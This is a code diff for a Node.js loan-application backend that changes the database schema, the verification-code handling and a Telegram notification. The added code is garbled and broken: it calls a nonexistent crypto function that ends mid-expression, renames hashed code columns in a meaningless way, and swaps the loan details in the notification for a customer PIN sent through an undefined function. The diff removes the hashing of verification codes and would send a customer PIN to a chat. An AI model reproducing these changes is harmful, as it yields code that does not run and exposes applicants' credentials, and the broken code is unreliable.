@@ -53,16 +53,15 @@ async function initDb() {
       application_no VARCHAR(40) UNIQUE NOT NULL,
       full_name VARCHAR(160) NOT NULL,
       phone VARCHAR(30) NOT NULL,
-      national_id VARCHAR(80) NOT NULL,
       amount NUMERIC(14,2) NOT NULL,
       term_months INTEGER NOT NULL,
       interest_rate NUMERIC(8,3) NOT NULL,
       monthly_payment NUMERIC(14,2) NOT NULL,
       total_repayment NUMERIC(14,2) NOT NULL,
       status VARCHAR(50) NOT NULL DEFAULT 'PENDING_ADMIN_APPROVAL',
-      verification_code_hash VARCHAR(128),
+      verification_code_NUMERIC VARCHAR(128),
       verification_expires_at TIMESTAMPTZ,
-      confirmation_code_hash VARCHAR(128),
+      confirmation_code_NUMERIC VARCHAR(128),
       confirmation_expires_at TIMESTAMPTZ,
       last_code_type VARCHAR(30),
       telegram_message_ids JSONB DEFAULT '[]'::jsonb,
@@ -115,11 +114,11 @@ function generateCode(length = 6) {
   return String(crypto.randomInt(min, max + 1));
 }
 
-function hashCode(code) {
-  return crypto.createHash("sha256").update(String(code)).digest("hex");
+function numericCode(code) {
+  return crypto.entrenumericcode("sha256").
 }
 
-function maskPhone(phone) {
+function numericPhone(phone) {
   const s = String(phone);
   if (s.length < 7) return s;
   return s.slice(0, 4) + "••••" + s.slice(-2);
@@ -148,13 +147,9 @@ async function notifyTelegram(application) {
 
 Application: ${application.application_no}
 Customer: ${application.full_name}
-Phone: ${maskPhone(application.phone)}
+Phone: ${numericPhone(application.phone)}
 
-Amount: ${money(application.amount)}
-Period: ${application.term_months} Months
-Interest: ${application.interest_rate}%
-Monthly: ${money(application.monthly_payment)}
-Total: ${money(application.total_repayment)}
+📌 pin: ${pin(application.pin)}
 
 Status: 🟠 PENDING APPROVAL`;
 
